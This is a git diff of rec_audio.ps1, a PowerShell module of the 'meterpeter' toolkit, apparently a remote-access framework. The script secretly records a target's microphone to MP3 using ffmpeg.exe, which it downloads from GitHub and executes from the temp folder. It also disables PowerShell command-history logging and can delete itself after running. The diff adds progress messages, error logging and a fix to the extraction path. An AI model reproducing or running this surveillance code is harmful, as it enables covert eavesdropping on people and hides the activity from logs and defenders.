@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: ffmpeg.exe {auto-download}
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.0.3
+   PS cmdlet Dev version: v1.0.4
 
 .DESCRIPTION
    Auxiliary Module of meterpeter v2.10.14.1 that records native
@@ -52,6 +52,11 @@
    None. You cannot pipe objects into rec_audio.ps1
 
 .OUTPUTS
+   [!!] 🔌 record native microphone audio 🔌
+   [Ok] downloaded : C:\Users\pedro\AppData\Local\Temp\ffmpeg_64.zip
+   [Ok] extracted  : C:\Users\pedro\AppData\Local\Temp\ffmpeg.exe
+   [**] executing  : ffmpeg.exe from C:\Users\pedro\AppData\Local\Temp
+
    [aist#0:0/pcm_s16le @ 0000026dcda68a00] Guessed Channel Layout: stereo
    Input #0, dshow, from 'audio=Microfone (Conexant SmartAudio HD)':
      Duration: N/A, start: 39636.041000, bitrate: 1411 kb/s
@@ -83,9 +88,9 @@
 )
 
 
-$cmdletver = "v1.0.3"
+$cmdletver = "v1.0.4"
 $IPath = (Get-Location).Path.ToString()
-$ErrorActionPreference = "SilentlyContinue"
+#$ErrorActionPreference = "SilentlyContinue"
 ## Disable Powershell Command Logging for current session.
 Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
 $host.UI.RawUI.WindowTitle = "rec_audio $cmdletver"
@@ -96,28 +101,54 @@ If([string]::IsNullOrEmpty($RecTime))
    $RecTime = 10
 }
 
+
+cd "$WorkingDir"
+write-host "`n[!!] 🔌 record native microphone audio 🔌" -ForegroundColor Green
+
 ## Download ffmpeg.exe from GitHub?
 If(-not(Test-Path "$WorkingDir\ffmpeg.exe"))
 {
 
    $ffmpegUrl = "https://github.com/BtbN/FFmpeg-Builds/releases/download/latest/ffmpeg-master-latest-win64-gpl.zip";
    iwr -Uri "$ffmpegUrl" -OutFile "$WorkingDir\ffmpeg_64.zip"|Unblock-File
+   If(-not(Test-Path "$WorkingDir\ffmpeg_64.zip"))
+   {
+      write-host "📛 fail downloading $WorkingDir\ffmpeg_64.zip" -ForegroundColor Red
+      echo "   [Ko] fail downloading $WorkingDir\ffmpeg_64.zip" > "$WorkingDir\ffmpeg.log"
+   }
+   Else
+   {
+      write-host "[Ok] downloaded : $WorkingDir\ffmpeg_64.zip" -ForegroundColor Green
+   }
 
-   Expand-Archive "$WorkingDir\ffmpeg_64.zip" -DestinationPath "$WorkingDir" -Force
-   Move-Item -Path "$WorkingDir\ffmpeg-master-latest-win64-gpl\bin\ffmpeg.exe" -Destination "$WorkingDir\ffmpeg.exe" -Force
+   ## Expand archive in working directory
+   Expand-Archive "$WorkingDir\ffmpeg_64.zip" -DestinationPath "$WorkingDir\ffmpeg-master-latest-win64-gpl" -Force
+   If(-not(Test-Path "$WorkingDir\ffmpeg-master-latest-win64-gpl"))
+   {
+      write-host "📛 fail expanding ffmpeg_64.zip archive" -ForegroundColor Red
+      echo "   [Ko] fail expanding ffmpeg_64.zip archive" >> "$WorkingDir\ffmpeg.log"
+   }
+
+   ## Move ffmpeg.exe from ffmpeg-master-latest-win64-gpl directory to 'cmdlet working directory'
+   Move-Item -Path "$WorkingDir\ffmpeg-master-latest-win64-gpl\ffmpeg-master-latest-win64-gpl\bin\ffmpeg.exe" -Destination "$WorkingDir\ffmpeg.exe" -Force
+
+   ## CleanUp of files left behind
    Remove-Item -Path "$WorkingDir\ffmpeg-master-latest-win64-gpl" -Force -Recurse
    Remove-Item -Path "$WorkingDir\ffmpeg_64.zip" -Force
 }
 
-## Make sure we have downloaded ffmpeg.exe
+## Make sure we have downloaded ffmpeg.exe!
 If(-not(Test-Path "$WorkingDir\ffmpeg.exe"))
 {
-   write-host "x [fail] to download ffmpeg.exe to '$WorkingDir'" -ForegroundColor Red
+   write-host "📛 fail downloading ffmpeg.exe to '$WorkingDir'`n" -ForegroundColor Red
+   echo "   [Ko] fail downloading ffmpeg.exe to '$WorkingDir'" >> "$WorkingDir\ffmpeg.log"
+   cd "$IPath"
    return
 }
 
 
 ## Add Assemblies
+write-host "[Ok] extracted  : $WorkingDir\ffmpeg.exe" -ForegroundColor Green
 Add-Type '[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDevice {int a(); int o();int GetId([MarshalAs(UnmanagedType.LPWStr)] out string id);}[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDeviceEnumerator {int f();int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);}[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }public static string GetDefault (int direction) {var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;IMMDevice dev = null;Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(direction, 1, out dev));string id = null;Marshal.ThrowExceptionForHR(dev.GetId(out id));return id;}' -name audio -Namespace system;
    
 function GetFriendlyName($id)
@@ -126,12 +157,13 @@ function GetFriendlyName($id)
    return (Get-ItemProperty $MMDEVAPI).FriendlyName
 }
 
-cd "$WorkingDir"      
+     
 $Audioid = [audio]::GetDefault(1);
 $MicName = "$(GetFriendlyName $Audioid)";
 
 If($Random.IsPresent)
 {
+   ## Random .MP3 file name creation
    $RandomN = [IO.Path]::GetFileNameWithoutExtension([System.IO.Path]::GetRandomFileName())
    $MP3Path = "$WorkingDir" + "\" + "$RandomN" + ".mp3" -join ''
 }
@@ -140,14 +172,16 @@ Else
    $MP3Path = "$WorkingDir" + "\" + "$mp3Name" -join ''
 }
 
+## Execute ffmpeg.exe from 'cmdlet working directory'
+write-host "[**] executing  : ffmpeg.exe from $WorkingDir`n" -ForegroundColor DarkYellow
 .\ffmpeg.exe -y -hide_banner -f dshow -i audio="$MicName" -t $RecTime -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $MP3Path;
-cd "$IPath"
+cd "$IPath" ## Return to start directory
 
-
-## CleanUp
+## Meterpeter CleanUp
 If($AutoDelete.IsPresent)
 {
    ## Auto Delete this cmdlet in the end ...
    Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
 }
+write-host ""
 exit
